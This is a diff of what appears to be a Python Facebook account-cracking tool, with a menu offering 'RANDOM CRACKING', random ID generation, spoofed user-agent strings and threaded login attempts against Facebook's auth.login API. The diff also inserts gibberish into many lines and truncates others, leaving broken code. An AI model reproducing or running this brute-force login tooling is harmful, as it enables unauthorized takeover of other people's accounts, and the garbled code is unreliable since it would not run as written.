@@ -104,14 +104,14 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 for x in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
+    aa='Mozilla/
     b=random.choice(['6','7','8','9','10','11','12'])
     c=f' TL-tl; {str(AMSS1)}'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
+    e=random.ran
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
+    h=random.ran,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
@@ -186,7 +186,7 @@ device = {
 yellow = "\x1b[38;5;208m"
 black="\033[1;30m"
 rad="\033[1;31m"
-green="\033[1;32m"
+greegcytcfvhvfvhvfv bb"\033[1;32m"
 yelloww="\033[1;33m"
 blue="\033[1;34m"
 purple="\033[1;35m"
@@ -195,7 +195,7 @@ white="\033[1;37m"
 faltu = "\033[1;41m"
 pvt = "\033[1;0m"
 my_color = [white,blue,green]
-warna = random.choice(my_color)
+warna = random.choice(my_color)b b b b fvy
 
 loop=0
 oks=[]
@@ -225,7 +225,7 @@ def linex():
 
 def mahadi():
     os.system('clear')
-    logo()
+    logo()vg bh jjnh
     print(f"{white}[{green}A{white}] {green}START RANDOM CRACKING")
     print(f"{white}[{green}B{white}] {green}MAIN ADMIN FB ACCOUNT")
     print(f"{white}[{green}C{white}] {green}JOIN TELEGRAM CHANNEL")
@@ -238,7 +238,7 @@ def mahadi():
         os.system('xdg-open https://www.facebook.com/profile.php?id=100068072949871')
     elif _____mahadi_____ in ['C','c','03','3']:
         os.system('xdg-open https://t.me/ABU_SAIM_SB_TEAM')
-    elif _____mahadi_____ in ['D','d','04','4']:
+    elif _____mahadi_____ in ['D','d','04','4']:hvg b hbhbubg d
         exit()
     else:
         print(f'\n[×]{rad} CHOOSE VALID OPTION... ');mahadi()
@@ -257,7 +257,7 @@ def ___uids___():
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     with tred(max_workers=30) as SefatMahadi:
-        os.system('clear')
+        os.system('clear')vghbjnjvd
         logo()
         tl = str(len(user))
         print(f'{green}┏━[{rad}+{green}] TOTAL ID    {yelloww}:  {white}'+tl)
@@ -347,7 +347,7 @@ def ___random___(ids,passlist):
             'Content-Type': 'application/x-www-form-urlencoded',
             "X-FB-Client-IP": "True",
             "X-FB-Server-Cluster": "True",
-            'X-FB-HTTP-Engine': 'Liger'
+            'X-FB-HTTP-Engine': 'Liger'v v dxrxrvybh
             }
             url = 'https://b-api.facebook.com/method/auth.login'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
